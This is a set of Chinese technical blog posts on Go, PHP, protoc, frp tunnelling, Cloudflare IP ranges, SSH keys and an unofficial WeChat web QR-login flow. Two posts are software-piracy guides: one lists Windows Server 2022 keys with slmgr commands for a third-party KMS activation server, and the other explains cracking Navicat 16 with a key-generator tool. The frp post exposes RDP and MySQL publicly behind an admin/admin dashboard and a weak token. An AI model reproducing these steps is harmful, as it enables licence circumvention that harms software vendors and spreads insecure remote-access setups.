[{"content":" 生成描述文件命令\n用法:\n1 swagger [选项] generate spec [命令] 应用选项:\n1 2 -q, --quiet 不显示log --log-output=LOG-FILE 输出Log到文件 帮助选项:\n1 -h, --help 显示帮助信息 [描述文件命令]\n1 2 3 4 5 6 7 8 9 10 11 -w, --work-dir= 基本工作路径 (默认: .) -t, --tags= 构建的标签 -m, --scan-models 引入模型 \u0026#39;swagger:model\u0026#39; --compact 不格式化json -o, --output= 输出文件路径 -i, --input= 添加需要合并的描述文件路径 -c, --include= 添加外部包路径 -x, --exclude= 不要引入的包路径 --include-tag= 引入带有特定tag的路径文件 (可声明多个) --exclude-tag= 不要引入带有特定tag的路径文件 (可声明多个) --exclude-deps 不引人项目所有依赖 生成swagger 文件 在项目根目录执行\nswagger generate spec –output=./XXX.yml XXX是文件名，即可生成\n运行server swagger serve –no-open -F=swagger –port 36666 XXX.yml 36666是端口号，xxx是文件名\n其他命令 合并文件 1 swagger mixin {spec1} {spec2} 扩充$ref 1 swagger expand {spec} 扁平化： 所有外部 $ref 都被导入到主文档中，并且内联模式被重新组织为定义。 1 swagger flatten {spec} 生成markdown 1 swagger generate markdown -f {spec} --output swagger.mode ","date":"2023-05-30T13:20:00Z","permalink":"https://blog.aaayun.cc/archives/973.html","title":"go-swagger 快速入门教程"},{"content":" 由于协作管理protoc版本不一致导致每次生成的文件都会冲突，直接用同一版本\n获取源码包 Git地址：https://github.com/protocolbuffers/protobuf/releases\n指定版本：https://github.com/protocolbuffers/protobuf/releases/tag/v3.21.12\n此处以3.21.12版本为例。\n安装或升级protoc 可以先阅读，各模块目录下的README.txt文件，了解安装和使用方法。\n我们必须先安装或升级ptotoc编译器，才能进一步编译获得，完整的python或java模块。\n1 2 3 4 5 6 7 8 unzip protobuf-3.21.12.zip cd protobuf-3.21.12 ./autogen.sh ./configure make make check make install protoc --version ","date":"2023-05-19T18:34:59Z","permalink":"https://blog.aaayun.cc/archives/971.html","title":"linux安装或升级protoc"},{"content":"golang实现百度智能小程序用户数据的解密 百度智能小程序官方文档\n博主在网上gitee github找了很多 几乎没有看到适配golang的方法，以下方法可行\n类库 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 /* * @author anderyly * @email admin@aaayun.cc * @link http://blog.aaayun.cc * @copyright Copyright (c) 2023 * */ package baidu import ( \u0026#34;crypto/aes\u0026#34; \u0026#34;crypto/cipher\u0026#34; \u0026#34;encoding/base64\u0026#34; \u0026#34;encoding/json\u0026#34; \u0026#34;errors\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;regexp\u0026#34; ) var _ AppletDataCrypt = (*appletDataCrypt)(nil) type AppletDataCrypt interface { Decrypt(data string, iv string, isJSON bool) (interface{}, error) // 解密 } type appletDataCrypt struct { AppID string SessionKey string } var errorCode = map[string]int{ \u0026#34;IllegalAppID\u0026#34;: -41000, \u0026#34;IllegalAesKey\u0026#34;: -41001, \u0026#34;IllegalIV\u0026#34;: -41002, \u0026#34;IllegalBuffer\u0026#34;: -41003, \u0026#34;DecodeBase64Error\u0026#34;: -41004, \u0026#34;DecodeJsonError\u0026#34;: -41005, } type showError struct { errorCode int errorMsg error } func NewAppletDataCrypt(appid, sessionKey string) AppletDataCrypt { return \u0026amp;appletDataCrypt{ AppID: appid, SessionKey: sessionKey, } } func (e showError) Error() string { return fmt.Sprintf(\u0026#34;{code: %v, error: \\\u0026#34;%v\\\u0026#34;}\u0026#34;, e.errorCode, e.errorMsg) } func (con *appletDataCrypt) Decrypt(data string, iv string, isJSON bool) (interface{}, error) { aesKey, err := base64.StdEncoding.DecodeString(con.SessionKey) if err != nil { return nil, showError{errorCode[\u0026#34;DecodeBase64Error\u0026#34;], err} } if len(iv) != 24 { return nil, showError{errorCode[\u0026#34;IllegalIV\u0026#34;], errors.New(\u0026#34;iv length is error\u0026#34;)} } aesIV, err := base64.StdEncoding.DecodeString(iv) if err != nil { return nil, showError{errorCode[\u0026#34;DecodeBase64Error\u0026#34;], err} } aesCipherText, err := base64.StdEncoding.DecodeString(data) if err != nil { return nil, showError{errorCode[\u0026#34;DecodeBase64Error\u0026#34;], err} } aesPlantText := make([]byte, len(aesCipherText)) aesBlock, err := aes.NewCipher(aesKey) if err != nil { return nil, showError{errorCode[\u0026#34;IllegalBuffer\u0026#34;], err} } mode := cipher.NewCBCDecrypter(aesBlock, aesIV) mode.CryptBlocks(aesPlantText, aesCipherText) aesPlantText = con.PKCS7UnPadding(aesPlantText) var decrypted map[string]interface{} re := regexp.MustCompile(`[^\\{]*(\\{.*\\})[^\\}]*`) aesPlantText = []byte(re.ReplaceAllString(string(aesPlantText), \u0026#34;$1\u0026#34;)) err = json.Unmarshal(aesPlantText, \u0026amp;decrypted) if err != nil { return nil, showError{errorCode[\u0026#34;DecodeJsonError\u0026#34;], err} } if isJSON == true { return string(aesPlantText), nil } return decrypted, nil } func (con *appletDataCrypt) PKCS7UnPadding(plantText []byte) []byte { length := len(plantText) if length \u0026gt; 0 { unPadding := int(plantText[length-1]) return plantText[:(length - unPadding)] } return plantText } 调用方法 1 2 // res为json需要自行json.Unmarshal这里不做演示 res, err := baidu.NewAppletDataCryp(\u0026#34;appid\u0026#34;, \u0026#34;sessionKey\u0026#34;).Decrypt(\u0026#34;加密的数据\u0026#34;, \u0026#34;偏移量\u0026#34;, true) ","date":"2023-03-18T10:42:47Z","permalink":"https://blog.aaayun.cc/archives/967.html","title":"golang实现百度智能小程序用户数据的解密"},{"content":"前言 之前代码使用websocket方式是直接下载workman文件放入vendor中进行使用，这种方式处理及其容易出现问题，比如linux运行正常而windows无法使用，每次部署代码拉取依赖包都会覆盖等奇奇怪怪的问题\n安装依赖 通过Composer.exe安装相关依赖： 1 composer require topthink/think-worker 如果报错，如下：\n1 2 3 4 5 6 7 8 9 composer require topthink/think-worker Using version ^2.0 for topthink/think-worker ./composer.json has been updated Loading composer repositories with package information Updating dependencies (including require-dev) Your requirements could not be resolved to an installable set of packages. Problem 1 topthink/think-worker v2.0.5 requires topthink/framework 5.1.* -\u0026gt; satisfiable by topthink/framework[5.1.x-dev, v5.1-beta.1, v5.1-rc.1, v5.1-rc.2, v5.1-rc.3, v5.1.0, v5.1.1, v5.1.10, v5.1.11, v5.1.12, v5.1.13, v5.1.14, v5.1.15, v5.1.16, v5.1.17, v5.1.18, v5.1.19, v5.1.2, v5.1.3, v5.1.4, v5.1.5, v5.1.6, v5.1.7, v5.1.8, v5.1.9] but these conflict with your requirements or minimum-stability. - topthink/think-worker v2.0.4 requires topthink/framework 5.1.* -\u0026gt; satisfiable by topthink/framework[5.1.x-dev, v5.1-beta.1, v5.1-rc.1, v5.1-rc.2, v5.1-rc.3, v5.1.0, v5.1.1, v5.1.10, v5.1.11, v5.1.12, v5.1.13, v5.1.14, v5.1.15, v5.1.16, v5.1.17, v5.1.18, v5.1.19, v5.1.2, v5.1.3, v5.1.4, v5.1.5, v5.1.6, v5.1.7, v5.1.8, v5.1.9] but these conflict with your requirements or minimum-stability. - topthink/think-worker v2.0.3 requires topthink/framework 5.1.* -\u0026gt; satisfiable by topthink/framework[5.1.x-dev, v5.1-beta.1, v5.1-rc.1, v5.1-rc.2, v5.1-rc.3, v5.1.0, v5.1.1, v5.1.10, v5.1.11, v5.1.12, v5.1.13, v5.1.14, v5.1.15, v5.1.16, v5.1.17, v5.1.18, v5.1.19, v5.1.2, v5.1.3, v5.1.4, v5.1.5, v5.1.6, v5.1.7, v5.1.8, v5.1.9] but these conflict with your requirements or minimum-stability. - topthink/think-worker v2.0.2 requires topthink/framework 5.1.* -\u0026gt; satisfiable by topthink/framework[5.1.x-dev, v5.1-beta.1, v5.1-rc.1, v5.1-rc.2, v5.1-rc.3, v5.1.0, v5.1.1, v5.1.10, v5.1.11, v5.1.12, v5.1.13, v5.1.14, v5.1.15, v5.1.16, v5.1.17, v5.1.18, v5.1.19, v5.1.2, v5.1.3, v5.1.4, v5.1.5, v5.1.6, v5.1.7, v5.1.8, v5.1.9] but these conflict with your requirements or minimum-stability. - topthink/think-worker v2.0.1 requires topthink/framework 5.1.* -\u0026gt; satisfiable by topthink/framework[5.1.x-dev, v5.1-beta.1, v5.1-rc.1, v5.1-rc.2, v5.1-rc.3, v5.1.0, v5.1.1, v5.1.10, v5.1.11, v5.1.12, v5.1.13, v5.1.14, v5.1.15, v5.1.16, v5.1.17, v5.1.18, v5.1.19, v5.1.2, v5.1.3, v5.1.4, v5.1.5, v5.1.6, v5.1.7, v5.1.8, v5.1.9] but these conflict with your requirements or minimum-stability. - topthink/think-worker v2.0.0 requires topthink/framework 5.1.* -\u0026gt; satisfiable by topthink/framework[5.1.x-dev, v5.1-beta.1, v5.1-rc.1, v5.1-rc.2, v5.1-rc.3, v5.1.0, v5.1.1, v5.1.10, v5.1.11, v5.1.12, v5.1.13, v5.1.14, v5.1.15, v5.1.16, v5.1.17, v5.1.18, v5.1.19, v5.1.2, v5.1.3, v5.1.4, v5.1.5, v5.1.6, v5.1.7, v5.1.8, v5.1.9] but these conflict with your requirements or minimum-stability. - Installation requestfortopthink/think-worker ^2.0 -\u0026gt; satisfiable by topthink/think-worker[v2.0.0, v2.0.1, v2.0.2, v2.0.3, v2.0.4, v2.0.5].Installation failed, reverting ./composer.json to its original content. Installation failed, reverting ./composer.json to its original content. 则是版本不匹配，用低版本的workerman，更改如下：\n1 composer require topthink/think-worker=1.0.* 如果是windows系统，还需安装依赖：\n1 composer require workerman/workerman-for-win 启动服务文件 在项目根目录里面新增server.php文件\n1 2 3 4 5 \u0026lt;?php define(\u0026amp;#039;APP_PATH\u0026amp;#039;, __DIR__ . \u0026amp;#039;/../application/\u0026amp;#039;); define(\u0026#34;BIND_MODULE\u0026#34;, \u0026#34;server/Screen\u0026#34;); // 加载框架引导文件 require __DIR__ . \u0026amp;#039;/../thinkphp/start.php\u0026amp;#039;; 增加控制器 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 \u0026lt;?php namespace app\\server\\controller; use think\\worker\\Server; class Screen extends Server { protected $socket = \u0026amp;#039;websocket://127.0.0.1:2346\u0026amp;#039;; private $all = []; /** * 收到信息 * @param $connection * @param $data */ public function onMessage($connection, $data) { // 广播 foreach ($this-\u0026gt;all as $v) { $v-\u0026gt;send(json_encode(\u0026#34;广播\u0026#34;)); } // $connection-\u0026gt;send(\u0026#34;收到消息啦，您的id:\u0026#34; . $connection-\u0026gt;id); } /** * 当连接建立时触发的回调函数 * @param $connection */ public function onConnect($connection) { // 保存所有已连接的客户端id $this-\u0026gt;all[$connection-\u0026gt;id] = $connection; } /** * 当连接断开时触发的回调函数 * @param $connection */ public function onClose($connection) { // 去除断开连接的客户端 unset($this-\u0026gt;all[$connection-\u0026gt;id]); } /** * 当客户端的连接上发生错误时触发 * @param $connection * @param $code * @param $msg */ public function onError($connection, $code, $msg) { echo \u0026#34;error $code $msg\u0026#34;; } /** * 每个进程启动 * @param $worker */ public function onWorkerStart($worker) { } } 启动监听服务 打开cmd或bash执行以下代码\n1 php server.php 测试 打开chrome浏览器， 先打开127.0.0.1域名下的网页（ js跨域不能通讯），按F12打开调试控制台， 在console一栏输入(或者把下面代码放入到html页面用js运行)\n1 2 3 4 5 6 7 8 9 10 ws = new WebSocket(\u0026#34;ws://127.0.0.1:2346\u0026#34;); ws.onopen = function() { alert(\u0026#34;连接成功\u0026#34;); ws.send(\u0026amp;#039;tom\u0026amp;#039;); alert(\u0026#34;给服务端发送一个字符串： tom\u0026#34;); }; ws.onmessage = function(e) { alert(\u0026#34;收到服务端的消息： \u0026#34; + e.data); }; ws.send(\u0026amp;#039;保持连接， 发第二次信息， 查看服务器回应\u0026amp;#039;); ","date":"2022-12-05T15:34:45Z","permalink":"https://blog.aaayun.cc/archives/952.html","title":"TP5使用workerman开启websocket服务"},{"content":"前期准备： 首先你要有一台云服务器或者VPS，有公网ip或域名都可以，内网主机（自己的电脑）一台。\n本文所用的服务端是我用阿里云的Linux系统，客户端是windows11系统。\n服务端(Linux)搭建步骤 下载服务端的frp\n使用tar命令解压下载成功的压缩包文件:\n1 tar -zxvf frp_0.45.0_linux_arm64.tar.gz 使用cd命令进入解压出来的文件夹: 1 mv frp_0.45.0_linux_arm64 frp \u0026amp;\u0026amp; cd frp 修改服务器配置文件(frps.ini): 1 2 3 4 5 6 7 8 9 10 11 12 13 vim fros.ini # 编辑 [common] bind_port = 7000 vhost_http_port = 88 vhost_https_port = 89 #与客户端通信的令牌 token = 57854 dashboard_user = admin #dashboard 密码 dashboard_pwd = admin #dashboard 端口，启动成功后可通过浏览器访问如http://ip:7500 dashboard_port = 7500 启动frp服务端，让frp在后台运行: 1 nohup ./frps -c frps.ini \u0026amp; \u0026gt; frp.log 这样即使关掉了SSH，frp依然在后台运行中。到此，服务端的搭建已经完成。\n客户端搭建步骤 下载客户端的frp，在上文地址下载最新windows压缩包\n解压下载成功的压缩包\n编辑frpc.ini文件，内容如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 [common] server_addr = x.x.x.x #公网ip server_port = 7000 #与服务端通信的令牌 token = 57854 [mysql] type = tcp #local_ip = 127.0.0.1 local_port = 3306 #本地mysql端口 remote_port = 3366 #印射公网端口 #连接Windows远程桌面的 [rdp] type = tcp local_ip = 127.0.0.1 local_port = 3389 remote_port = 3389 custom_domains = x.x.x.x #公网ip或域名 [web01] type = http local_ip = 127.0.0.1 local_port = 80 locations = / custom_domains = x.x.x.x #公网ip或域名 [web02] type = http local_ip = 127.0.0.1 local_port = 8090 locations = /cardmanager custom_domains = x.x.x.x #公网ip或域名 #通过tcp来连接svn [svn] type = tcp local_ip =127.0.0.1 local_port = 81 remote_port = 9000 启动frp客户端：\n在目录下打开cmd命令窗口，执行如下命令： 1 frpc.exe -c frpc.ini 到此，客户端的搭建已经完成。\n","date":"2022-12-02T15:43:55Z","permalink":"https://blog.aaayun.cc/archives/947.html","title":"最好用的完全开源的内网穿透工具frps"},{"content":"前言 centos7默认源的php版本只有5.4，版本太老，而mediawiki需要的php版本为7.4以上，所以本文直接升级到php8.0。\n步骤 卸载所有已安装的php\n1 yum remove -y php* 添加remi源（可能需要提前安装epel-release）\n1 2 3 4 yum install -y https://rpms.remirepo.net/enterprise/remi-release-7.rpm # 此处若是无法下载 可用 rpm -Uvh https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm rpm -Uvh https://rpms.remirepo.net/enterprise/remi-release-7.rpm 单独启用php80的源（没有yum-config-manager命令的话需要安装yum-utils）\n1 2 yum-config-manager --disable \u0026amp;#039;remi-php*\u0026amp;#039; yum-config-manager --enable remi-php80 安装php及其拓展\n1 yum install -y php php-bcmath php-cli php-common php-devel php-fpm php-gd php-intl php-ldap php-mbstring php-mysqlnd php-odbc php-pdo php-pear php-pecl-xmlrpc php-pecl-zip php-process php-snmp php-soap php-sodium php-xml 版本验证\n1 php -v ","date":"2022-12-01T15:28:12Z","permalink":"https://blog.aaayun.cc/archives/943.html","title":"centos7系统安装php8"},{"content":"\n","date":"2022-11-24T11:22:14Z","permalink":"https://blog.aaayun.cc/archives/930.html","title":"爱"},{"content":"什么是自选IP？ 一般来说为了达到隐藏自身 IP，我们都会选择一些 CDN 服务，目前用的最多的免费 CDN 是 Cloudflare。但是正常情况下 Cloudflare 是不能自己选择IP，有时候分配给我们的 IP 可能表现不佳，也只能将就着用。但是我们都希望可以用上 CF 比较快的 IP。那么自选IP，就显得很必要了。\n所以这篇文章，苏苏就跟大家聊聊怎么自定义 CF 的节点。\n官网列表：https://www.cloudflare.com/zh-cn/ips/\n测试最优前10 104.16.160.1/24 162.159.209.4/103 104.24.0.0/14 108.162.192.0/18 104.20.157.0/24 162.159.210.4/103 141.101.115.0/254 172.64.0.0/13 162.159.208.4/103 162.159.211.4/103 CFIP白名单 173.245.48.0/20 103.21.244.0/22 103.22.200.0/22 103.31.4.0/22 141.101.64.0/18 108.162.192.0/18 190.93.240.0/20 188.114.96.0/20 197.234.240.0/22 198.41.128.0/17 162.158.0.0/15 104.16.0.0/12 172.64.0.0/13 131.0.72.0/22 百度云加速与Cloudflare合作节点 162.159.211.4-103 103.21.244.0/22 103.22.200.0/22 103.31.4.0/22 104.16.0.0/12 108.162.192.0/18 131.0.72.0/22 141.101.64.0/18 162.158.0.0/15 172.64.0.0/13 173.245.48.0/20 188.114.96.0/20 190.93.240.0/20 197.234.240.0/22 198.41.128.0/17 CloudFlare 百度云合作 IP 162.159.208.4-162.159.208.103 162.159.209.4-162.159.209.103 162.159.210.4-162.159.210.103 162.159.211.4-162.159.211.103 各线路推荐列表： 电信：推荐走圣何塞，例：104.16.160.* 或者上面的百度云合作 ip。 移动：推荐走移动香港，例：172.64.32.*、141.101.115.* 或者 104.23.240.0-104.23.243.254。 联通：没发布什么好线路，可走圣何塞。例：104.16.160.* 或者 104.23.240.0-104.23.243.254。也可以试一下走亚特兰大 108.162.236.*（日前不可用）。 Qi推荐 108.162.236.1/24 联通 走美国 172.64.32.1/24 移动 走香港 104.16.160.1/24 电信 走美国洛杉矶 ——— 172.64.0.0/24 电信 美国旧金山 104.20.157.0/24 联通 走日本 104.28.14.0/24 移动 走新加坡 （联通移动推荐节点） 104.23.240.0-104.23.243.254 （电信推荐百度云合作ip） 162.159.208.4-162.159.208.103 162.159.209.4-162.159.209.103 162.159.210.4-162.159.210.103 162.159.211.4-162.159.211.103 适合电信的节点 104.23.240.* 走欧洲各国出口 英国德国荷兰等 延迟比美国高一些 适合源站在欧洲的网站 172.64.32.* 虽然去程走新加坡，但是回程线路的绕路的，实际效果不好，不推荐 104.16.160.* 圣何塞的线路，比洛杉矶要快一点，推荐 108.162.236.* 亚特兰大线路，延迟稳定，但是延迟较高 适合移动的节点 162.158.133.* 走的丹麦，这一段ip只有部分能用，可以自己试一下。绕美国。 198.41.214.* 198.41.212.* 198.41.208.* 198.41.209.* 172.64.32.* 141.101.115.*移动走香港的IP段有很多，以上并不是全部。CF移动走香港的分直连和走ntt的效果都挺不错的，不过部分地区晚上还是会丢包。 172.64.0. *这是走圣何塞的，一般用香港的就行 172.64.16.* 欧洲线路.绕 1.0.0.1效果较好\n大多数省直接使用1.0.0.0即可，延迟低，丢包少\n少部分还是需要换ip\n新加坡 172.64.32.0-172.64.47.254\n","date":"2022-11-01T17:23:32Z","permalink":"https://blog.aaayun.cc/archives/925.html","title":"Cloudflare国内自选IP节点整理收录"},{"content":"在开发过程中，我们有时会遇到这样的问题，将 2022-10-22T08:18:46+08:00 转成 2022-10-22 08:18:46，怎么解决这个问题？\n解决这个问题，最好不要用字符串截取，或者说字符串截取是最笨的方法，这应该是时间格式化的问题。\n我们先看一下 golang time 包中支持的 format 格式：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 const ( ANSIC = \u0026#34;Mon Jan _2 15:04:05 2006\u0026#34; UnixDate = \u0026#34;Mon Jan _2 15:04:05 MST 2006\u0026#34; RubyDate = \u0026#34;Mon Jan 02 15:04:05 -0700 2006\u0026#34; RFC822 = \u0026#34;02 Jan 06 15:04 MST\u0026#34; RFC822Z = \u0026#34;02 Jan 06 15:04 -0700\u0026#34; // RFC822 with numeric zone RFC850 = \u0026#34;Monday, 02-Jan-06 15:04:05 MST\u0026#34; RFC1123 = \u0026#34;Mon, 02 Jan 2006 15:04:05 MST\u0026#34; RFC1123Z = \u0026#34;Mon, 02 Jan 2006 15:04:05 -0700\u0026#34; // RFC1123 with numeric zone RFC3339 = \u0026#34;2006-01-02T15:04:05Z07:00\u0026#34; RFC3339Nano = \u0026#34;2006-01-02T15:04:05.999999999Z07:00\u0026#34; Kitchen = \u0026#34;3:04PM\u0026#34; // Handy time stamps. Stamp = \u0026#34;Jan _2 15:04:05\u0026#34; StampMilli = \u0026#34;Jan _2 15:04:05.000\u0026#34; StampMicro = \u0026#34;Jan _2 15:04:05.000000\u0026#34; StampNano = \u0026#34;Jan _2 15:04:05.000000000\u0026#34; ) 我们找到了 RFC3339 ，那就很简单了，我们封装一个方法 RFC3339ToDateTime，见下面代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 package lib import \u0026#34;time\u0026#34; var _ Time = (*timer)(nil) const cstLayout = \u0026#34;2006-01-02 15:04:05\u0026#34; type Time interface { RFC3339ToDateTime(value string) (string, error) } type timer struct { Cst *time.Location } func NewTime() Time { cst, _ := time.LoadLocation(\u0026#34;Asia/Shanghai\u0026#34;) return \u0026amp;timer{ Cst: cst, } } func (con *timer) RFC3339ToDateTime(value string) (string, error) { ts, err := time.Parse(time.RFC3339, value) if err != nil { return \u0026#34;\u0026#34;, err } return ts.In(con.Cst).Format(cstLayout), nil } 运行一下\n1 2 3 4 5 6 7 8 v, err := lib.NewTime().RFC3339ToDateTime(\u0026#34;2022-10-22T08:18:46+08:00\u0026#34;) if err != nil { fmt.Println(err) } fmt.Println(v) 输出： 2020-11-08 08:18:46 小结\n同理，若遇到 RFC3339Nano、RFC822、RFC1123 等格式，也可以使用类似的方法，只需要在 time.Parse() 中指定时间格式即可。\n","date":"2022-10-26T17:07:10Z","permalink":"https://blog.aaayun.cc/archives/914.html","title":"golang中time.RFC3339时间格式化"},{"content":"微信个人版扫码登入 此方法适用于个人开发者想使用微信扫码快速登入，但是又申请不了微信开放平台授权的个人用户，经测试此方法可用，demo下载地址在最底部\n获取uuid get方式请求以下接口会返回uuid信息\n1 2 3 4 5 // 地址 https://login.wx.qq.com/jslogin?appid=wx782c26e4c19acffb\u0026amp;redirect_uri=https%3A%2F%2Fweb.weixin.qq.com%2Fcgi-bin%2Fmmwebwx-bin%2Fwebwxnewloginpage\u0026amp;fun=new\u0026amp;lang=zh_\u0026amp;_=1663918497103 // 结果 window.QRLogin.code = 200; window.QRLogin.uuid = \u0026amp;quot;mmmmmmmmmm\u0026amp;quot;; 组装获取qrcode 1 https://login.weixin.qq.com/qrcode/{{第一步获取到的uuid}} 轮询get访问获取微信返回信息 1 https://login.wx.qq.com/cgi-bin/mmwebwx-bin/login?loginicon=true\u0026amp;amp;uuid={{第一步获取到的uuid}} 当用户扫码时会出现code 201，此时接口会返回base64图片\n1 window.code=201;window.userAvatar = \u0026amp;#039;data:img/jpg;......\u0026amp;#039;; 当用户在手机上确定登入，则接口会返回code 200 并返回地址，此时模拟访问此地址并获取cookie信息\n1 2 3 4 5 6 // 返回信息 window.code=200; window.redirect_uri=\u0026amp;quot;https://wx2.qq.com/cgi-bin/mmwebwx-bin/webwxnewloginpage?ticket=A_mmmmmmmmmmmmmmmmmmmmmm@qrticket_0\u0026amp;amp;uuid=mmmmmmmmmmmm\u0026amp;amp;lang=zh_\u0026amp;amp;scan=1661918912\u0026amp;quot;; // 抓取到的cookie pac_uid=0_65cf11501295d; iip=0; pgv_pvid=8666222200; wxuin=1044427715; wxsid=1DTmzGGGDDDWSyuR; mm_lang=zh_; wxuin=1044427715; webwx_data_ticket=gSe4NFFFSDDSDSCC/kmhPNLO; webwxuvid=47a38a6FSDSCSCSCFGDGDGDGDGDGD1cd69355a523b64a548db8717f173d68ee1; webwx_auth_ticket=CIsBEJrPiGEDFDVERFDSFSGBDGFVSDFFCSDVDFSVGDSFCV7gxbszLyHqQCXa1sw0XMHM6sjVxfVWR/IIVn3jO97euZPMIT0jSDFVRFVGBRFBHGBHFSGSBSDGSDFGDFFSDDSFSDFDSFSDFTI=; MM_WX_NOTIFY_STATE=1; MM_WX_SOUND_STATE=1; wxloadtime=1663918937_expired; wxpluginkey=16633456778 ps: 博主经过多次测试，发现只有wxuin是固定的，因此用wxuin代openid进行快速登入或注册\n同一账号短时间内请勿多次登入\n{cloud title=\u0026ldquo;golang 测试Demo\u0026rdquo; type=\u0026ldquo;default\u0026rdquo; url=\u0026ldquo;https://uss.aaayun.cc/2022/09/20221025030654688.zip\" password=\u0026rdquo;\u0026quot;/}\n","date":"2022-09-23T16:28:00Z","permalink":"https://blog.aaayun.cc/archives/899.html","title":"微信个人版扫码登入"},{"content":" Server2022 零售版：\nRGN6B-MCPWX-6K6GK-HKM33-7VCXY – Standard 标准版（非图形界面和桌面体验）\nDNVBD-FCT8Y-TQT8Q-HGQ34-QGRRV – Datacenter 数据中心版（非图形界面和桌面体验）\nServer2022 GVLK版：\nVDYBN-27WPP-V4HQT-9VMD4-VMK7H – Standard 标准版（非图形界面和桌面体验）\nWX4NM-KYWYW-QJJR4-XV3QB-6VM33 – Datacenter 数据中心版（非图形界面和桌面体验）\n以管理员身份运行powershell或cmd，输入以下命令激活\nKMS激活server2022命令：\nslmgr -ipk WX4NM-KYWYW-QJJR4-XV3QB-6VM33 slmgr -skms kms.0t.net.cn slmgr -ato ","date":"2022-09-17T10:09:43Z","permalink":"https://blog.aaayun.cc/archives/894.html","title":"Windows Server 2022 KMS 激活序列号"},{"content":" 首先去官网下载对应的版本并安装，选择自己的安装路径 下载激活工具NavicatCracker\n断开网络\n选择安装路径并点击Path\n生成激活码\n打开Navicat16并填入刚才生成的激活码点击激活\n选择手动激活 将 Navicat 给的请求码复制到注册机中，点击进行激活.复制激活码 激活成功 ","date":"2022-09-05T10:48:46Z","permalink":"https://blog.aaayun.cc/archives/874.html","title":"Navicat Premium for Win v16.0.14 完美激活"},{"content":"前言 使用win11自带的SSH工具登录Linux，不需要每次都输入密码。网上找了很多教程才找到合适的，重新整理和操作并记录下来，给相同需求的小伙伴提供参考。（所有的操作都是在win11的CMD命令行）\n生成公钥文件 1 ssh-keygen -t rsa -c \u0026#34;admin@aaayun.cc\u0026#34; 上传公钥文件（win11） 找到自己的公钥路径 (C:\\Users\\你的用户名.ssh)\n1 scp C:\\Users\\anderyly\\.ssh\\id_rsa.pub root@192.168.2.222:~/.ssh 重命名公钥文件 登录linux，此时仍需要密码登陆 1 ssh root@192.168.2.222 重命名公钥文件 1 2 cd /root/.ssh mv id_rsa.pub authorized_keys 修改文件权限 修改文件权限 1 2 chmod 600 authorized_keys chmod 700 /root/.ssh 修改SSH配置文件 1 vim /etc/ssh/sshd_config 保证这三句不被注释掉，如果没有则添加新的对应的语句，我需要添加\u0026quot;RSAAuthentication yes\u0026quot;\nRSAAuthentication yes PubkeyAuthentication yes AuthorizedKeysFile .ssh/authorized_keys\n1 2 3 4 5 6 7 保存退出 3. 重新启动SSH服务（Linux） ```shell systemctl restart sshd ","date":"2022-08-31T09:32:13Z","permalink":"https://blog.aaayun.cc/archives/859.html","title":"win11自带SSH免密登录Linux"},{"content":" 开发初衷\n此框架陪伴了博主三年多，因为经常开发小系统，其他框架有些东西真好用（TP的连贯操作、C函数等），想把这些抠出来太难了。故此写了很多第三方类，后来觉得文件太多了，每次开发都要重新复制并命名（命名空间）很麻烦，故此开发了这样一个轻量级框架，用此框架无需担心用户注入等危险操作，框架在路由层已全面去除可能存在的危险字符（sql、xss、特殊字符）\n框架lib下类文件均可以独立使用，如果您并不希望使用此框架，可以单独取出所需要的类文件使用\n此文章将长期更新\nps: 此框架支持PHP8，数据库采用PDO\n源码地址\n规范 目录和文件 目录使用小写+下划线； 类库、函数文件统一以.php为后缀； 类的文件名均以命名空间定义，并且命名空间的路径和类库文件所在路径一致； 类文件采用驼峰法命名（首字母大写），其它文件采用小写+下划线命名； 类名和类文件名保持一致，统一采用驼峰法命名（首字母大写）； 函数和类、属性命名 类的命名采用驼峰法（首字母大写），例如User、UserType，默认不需要添加后缀，例如UserController应该直接命名为User； 函数的命名使用小写字母和下划线（小写字母开头）的方式，例如get_client_ip； 方法的命名使用驼峰法（首字母小写），例如getUserName； 属性的命名使用驼峰法（首字母小写），例如tableName、instance； 以双下划线“__”打头的函数或方法作为魔术方法，例如__call和__autoload； 目录结构 project 应用部署目录 ├─app 应用目录 │ ├─index 模块目录(可更改) │ │ ├─controller 控制器目录 │ │ ├─model 模型目录 │ │ ├─view 视图目录 │ ├─function.php 应用（公共）自定义函数 ├─ay 框架系统目录 │ ├─unity.php 核心函数 │ ├─drive 框架驱动文件 │ ├─lib 框架类文件 │ ├─Base.php 基础定义文件 │ ├─Core.php 控制台入口文件 │ └─ay.php 框架引导文件 ├─config 框架配置目录 │ │ └─app.php 基础配置文件 │ │ └─file.php 上传配置 │ │ └─database.php 数据库配置文件 │ │ └─image.php 图片配置文件 │ │ └─redis.php redis配置文件 │ │ └─route.php 路由配置文件 ├─extend 扩展类库目录 ├─public 公共资源目录 │ ├─static 静态资源存放目录(css,js,image) │ ├─index.php 应用入口文件 │ ├─.htaccess 用于 apache 的重写 ├─temp 应用的运行时目录（可写，可设置） ├─vendor 第三方类库目录（Composer） ├─README.md README 文件 核心类 Request请求类 引入Request类\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 use ay\\lib\\Request; // 获取全部参数 dump(Request::instance()-\u0026gt;param()); // 获取get参数参数 dump(Request::instance()-\u0026gt;get()); // 获取post请求参数 status字段并格式化成int类型 dump(Request::instance()-\u0026gt;post(\u0026#34;status\u0026#34;, \u0026#34;int\u0026#34;)); // 获取put请求正文 dump(Request::instance()-\u0026gt;put()); // 获取delete请求参数 dump(Request::instance()-\u0026gt;delete()); Session 引入Session类\n1 2 3 4 5 6 7 8 9 10 11 